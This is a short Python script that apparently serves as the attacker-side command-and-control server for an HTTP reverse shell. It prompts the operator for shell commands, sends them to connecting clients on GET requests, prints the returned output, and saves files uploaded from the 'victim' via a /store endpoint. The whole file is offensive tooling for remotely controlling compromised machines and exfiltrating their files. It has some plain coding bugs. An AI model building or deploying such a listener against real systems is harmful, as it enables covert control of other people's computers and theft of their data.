#!/usr/bin/env python3 

from http.server import HTTPServer, BaseHTTPRequestHandler
import os
import cgi

PORT = 8000
SERVER_IPADDR = "192.168.1.205"

class MyGetRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()

        command = input("shell >>  ")
        self.wfile.write(command.encode())
    
    def do_POST(self):
        if self.path.endswith("/store"):
            try:
                ctype,pdick = cgi.parse_header(self.headers.get("content-type"))
                if ctype == "multipart/form-data":
                    fs = cgi.FieldStorage(fp=self.rfile,headers=self.headers,environ={"REQUEST_METHOD":"POST"})
                else:
                    print("Unexpted POST request")
                victimFileObject = fs["file"]
                with open("newFile.mp4","wb") as fileObject:
                    print("Writing File ..")
                    fileObject.write(victimFileObject.file.read())
                    self.send_response(200)
                    self.end_headers()
            except Exception as e:
                print(e)
        self.send_response(200)
        self.end_headers()
        length = int(self.headers["Content-length"])
        postData = self.rfile.read(length)
        print(postData.decode())

def web_server():
    print("Listing on {}:{} \n".format(SERVER_IPADDR, PORT))
    server = HTTPServer
    httpd = server((SERVER_IPADDR,PORT),MyGetRequestHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()

if __name__ == "__main__":
    web_server()